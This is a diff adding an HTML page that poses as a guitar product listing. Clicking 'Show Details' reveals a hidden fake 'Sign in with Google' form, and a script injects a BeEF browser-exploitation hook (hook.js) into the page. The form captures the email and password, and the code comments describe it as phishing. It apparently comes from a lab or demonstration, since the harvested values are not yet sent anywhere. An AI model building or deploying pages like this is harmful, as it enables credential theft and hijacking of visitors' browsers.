@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Awesome Guitar</title>
+    <style>
+        /* Main Page Styles */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f8f8;
+            margin: 0;
+            padding: 0;
+        }
+
+        .header {
+            background-color: #333;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .product-details {
+            padding: 20px;
+            margin: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 10px;
+            background-color: #333;
+            color: white;
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+        }
+
+        /* Sign-in Form Styles */
+        .signin-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            margin: auto;
+        }
+
+        .signin-container h2 {
+            text-align: center;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .signin-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+        }
+
+        .signin-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .signin-container button:hover {
+            background-color: #357AE8;
+        }
+    </style>
+</head>
+<body>
+    <!-- Main Guitar Page -->
+    <div class="header">
+        <h1>Awesome Guitar</h1>
+        <p>Brand new guitar with exceptional sound quality!</p>
+    </div>
+
+    <div class="product-details">
+        <h2>Details</h2>
+        <p>Price: $499</p>
+        <p>Made of top-quality wood and custom pickups.</p>
+        <button id="showDetailsButton">Show Details</button>
+    </div>
+
+    <div class="footer">
+        <p>&copy; 2025 Awesome Guitars</p>
+    </div>
+
+    <!-- Fake Google Sign-In Page (Hidden) -->
+    <div id="google-signin" style="display:none;">
+        <div class="signin-container">
+            <h2>Sign in with Google</h2>
+            <form id="loginForm">
+                <input type="email" id="email" placeholder="Email or phone" required><br>
+                <input type="password" id="password" placeholder="Enter your password" required><br>
+                <button type="submit">Next</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- BeEF Injection -->
+    <script>
+        // BeEF Hook Injection (Ensure BeEF is running and hooked target browser)
+        var script = document.createElement("script");
+        script.src = "http://localhost:3000/hook.js"; // BeEF hook URL
+        document.head.appendChild(script);
+
+        // Show details button action
+        document.getElementById("showDetailsButton").addEventListener("click", function() {
+            // Show fake Google sign-in page
+            document.getElementById("google-signin").style.display = "block";
+            document.querySelector(".product-details").style.display = "none"; // Hide product details
+        });
+
+        // Fake Google sign-in logic
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault(); // Prevent the default form submission
+
+            // Simulate data collection (in real phishing, this would send to a server, but here we'll just alert)
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            // Fake login success, redirect back to the guitar page
+            alert("Login successful!");
+            window.location.href = "#"; // Redirect to product details (simulate returning after login)
+        });
+    </script>
+</body>
+</html>
